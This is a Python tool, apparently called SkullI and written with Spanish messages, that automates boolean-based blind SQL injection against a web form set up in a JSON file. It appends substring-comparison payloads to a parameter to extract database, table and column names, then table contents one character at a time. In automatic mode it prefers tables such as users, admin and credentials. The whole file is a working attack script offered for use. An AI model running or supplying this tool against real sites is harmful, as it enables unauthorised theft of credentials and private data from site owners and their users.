#!/usr/bin/env python3

import requests, sys, string, signal, json, time, argparse
from pwn import log
from os import path,remove

def ctrl_c(sig,frame):
    print('\n\nSaliendo....\n')
    sys.exit(1)
signal.signal(signal.SIGINT, ctrl_c)

def def_args():
    parser = argparse.ArgumentParser(description='Herramienta que automatiza Inyecciones SQL - Creador: n4g1')
    parser.add_argument('json_file', help='Archivo con las configuraciones de la inyeccion')
    parser.add_argument('-a', '--automatic', action='store_true', help='Ejecuta la inyeccion automaticamente, sin esperar opciones')
    parser.add_argument('-l', '--log', default=False, help='Guarda los datos obtenidos en un archivo log.txt')
    parser.add_argument('-r', '--recursive', action='store_true', help='Extrae datos de TODAS las bases de datos disponibles')
    args = parser.parse_args()
    return args

def get_data(json_file):
    try:
        with open(json_file, 'r') as file:
            json_data = json.load(file)
        url = json_data['url']
        method = json_data['method'].lower()
        headers = json_data['headers']
        data = json_data['data']
        skll = json_data['skulli']
        match = json_data['match']

        return url,method,headers,data,skll,match
    except Exception as e:
        print(e)
        sys.exit(1)


class Skulli:
    def __init__(self,url,method,headers,data,skll,match,automatic,log,recursive):
        self.url = url
        self.method = method
        self.headers = headers
        self.data = data
        self.skll = skll
        self.match = match
        self.automatic = automatic
        self.log = log
        self.recursive = recursive
        self.characters = string.ascii_letters + string.digits + '_-$#@!.,<>?;:* '
        self.old_data = self.data[self.skll]
        
    def create_log(self,header,logs):
        log_name = f'{self.log}.txt'
        if path.exists(log_name) and header == 'Databases':
            remove(log_name)
        try:
            with open(log_name, 'a') as skll_log:
                parse_logs = logs.replace(',', '\n')
                skll_log.write(f"{header}:\n\n{parse_logs}")
        except Exception as e:
            print(e)
        
    def set_options(self,options):
        list_options = options.split(',')
        good_words = ['users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales']
        
        if len(options) == 1:
            return 0
        
        for word in good_words:
            if word in options:
                index = list_options.index(word)
                return index
        return self.which_options(options)

    def which_options(self,options):
        options = options.split(',')

        if len(options) == 1:
            return 0
        
        print('\n[+] Elige una opcion:\n')

        for i,value in enumerate(options):
            print(f'({i}) {value}')
        print('\n')
        while True:
            select_option = int(input('[+]~ '))

            if select_option > (len(options) - 1) or select_option < 0:
                print('[!] Opcion invalida')
            else:
                break
        return select_option
    
    def get_databases_len(self):
        ln = None

        for i in range(1,200):
            length = f"' or length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
            self.data[self.skll] += length
            
            if self.method == 'post':
                r = requests.post(self.url, data=self.data, headers=self.headers)
            else:
                 r = requests.get(self.url, data=self.data, headers=self.headers)
            self.data[self.skll] = self.old_data
            if self.match not in r.text:
                ln = i
                break
        self.data[self.skll] = self.old_data
        return ln

    def get_databases(self,db_len):
        databases = ''
        p2 = log.progress('Databases')

        for pos in range(1,db_len + 1):
            for char in self.characters:
                payload = f"' or binary substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
                self.data[self.skll] += payload

                if self.method == 'post':
                    r = requests.post(self.url, data=self.data, headers=self.headers)
                else:
                    r = requests.get(self.url, data=self.data, headers=self.headers)

                self.data[self.skll] = self.old_data
                if self.match not in r.text:
                    databases += char
                    p2.status(databases)
                    break
        self.data[self.skll] = self.old_data

        if self.log:
            self.create_log('Databases', databases)
        return databases

    def get_tables_len(self, db):
        ln = None

        for i in range(1,200):
            length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'))={i}-- -"
            self.data[self.skll] += length
            
            if self.method == 'post':
                r = requests.post(self.url, data=self.data, headers=self.headers)
            else:
                 r = requests.get(self.url, data=self.data, headers=self.headers)
            self.data[self.skll] = self.old_data
            if self.match not in r.text:
                ln = i
                break
        self.data[self.skll] = self.old_data
        return ln

    def get_tables(self, tb_len, db):
        tables = ''
        p2 = log.progress(f'Tables ({db})')

        for pos in range(1,tb_len + 1):
            for char in self.characters:
                payload = f"' or binary substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
                self.data[self.skll] += payload

                if self.method == 'post':
                    r = requests.post(self.url, data=self.data, headers=self.headers)
                else:
                    r = requests.get(self.url, data=self.data, headers=self.headers)

                self.data[self.skll] = self.old_data
                if self.match not in r.text:
                    tables += char
                    p2.status(tables)
                    break
        self.data[self.skll] = self.old_data

        if self.log:
            self.create_log('\n\nTables', tables)
        return tables

    def get_columns_len(self, db, table):
        ln = None

        for i in range(1,200):
            length = f"' or length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
            self.data[self.skll] += length
            
            if self.method == 'post':
                r = requests.post(self.url, data=self.data, headers=self.headers)
            else:
                 r = requests.get(self.url, data=self.data, headers=self.headers)
            self.data[self.skll] = self.old_data
            if self.match not in r.text:
                ln = i
                break
        self.data[self.skll] = self.old_data
        return ln

    def get_columns(self, cl_len, db, table):
        columns = ''
        p2 = log.progress(f'Columns ({db})->({table})')

        for pos in range(1,cl_len + 1):
            for char in self.characters:
                payload = f"' or binary substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
                self.data[self.skll] += payload

                if self.method == 'post':
                    r = requests.post(self.url, data=self.data, headers=self.headers)
                else:
                    r = requests.get(self.url, data=self.data, headers=self.headers)

                self.data[self.skll] = self.old_data
                if self.match not in r.text:
                    columns += char
                    p2.status(columns)
                    break
        self.data[self.skll] = self.old_data

        if self.log:
            self.create_log('\n\nColumns', columns)
        return columns

    def get_values_len(self, db, table, columns):
        ln = None

        for i in range(1,300):
            length = f"' or char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
            self.data[self.skll] += length
            
            if self.method == 'post':
                r = requests.post(self.url, data=self.data, headers=self.headers)
            else:
                 r = requests.get(self.url, data=self.data, headers=self.headers)
            self.data[self.skll] = self.old_data
            if self.match not in r.text:
                ln = i
                break
        self.data[self.skll] = self.old_data
        return ln

    def get_values(self, vl_len, db, table, columns):
        values = ''
        parse_columns = columns.replace(',0x3a,', ',')
        p2 = log.progress(f'Values ({db})->({table})->({parse_columns})')

        for pos in range(1,vl_len + 1):
            for char in self.characters:
                payload = f"' or binary substring((select group_concat({columns}) from {db}.{table}),{pos},1)='{char}'-- -"
                self.data[self.skll] += payload

                if self.method == 'post':
                    r = requests.post(self.url, data=self.data, headers=self.headers)
                else:
                    r = requests.get(self.url, data=self.data, headers=self.headers)

                self.data[self.skll] = self.old_data
                if self.match not in r.text:
                    values += char
                    p2.status(values)
                    break
        self.data[self.skll] = self.old_data

        if self.log:
            self.create_log('\n\nValues', values)

    def initial(self):
        p1 = print('[+] Iniciando SkullI')
        time.sleep(2)
        databases = self.get_databases(self.get_databases_len())
        option1 = self.which_options(databases) if not self.automatic else self.set_options(databases)
        database = databases.split(',')[option1]

        print('\n')

        tables = self.get_tables(self.get_tables_len(database), database)
        option2 = self.which_options(tables) if not self.automatic else self.set_options(tables)
        table = tables.split(',')[option2]

        print('\n')

        columns = self.get_columns(self.get_columns_len(database,table), database, table)
        columns = columns.replace(',', ",0x3a,")
        # #print(columns)

        print('\n')

        self.get_values(self.get_values_len(database,table,columns),database,table,columns)

def start():
    args = def_args()
    json_file = args.json_file
    automatic = args.automatic
    log = args.log
    recursive = args.recursive
    
    url,method,headers,data,skll,match = get_data(json_file)
    sk = Skulli(url,method,headers,data,skll,match,automatic,log,recursive)
    sk.initial()
    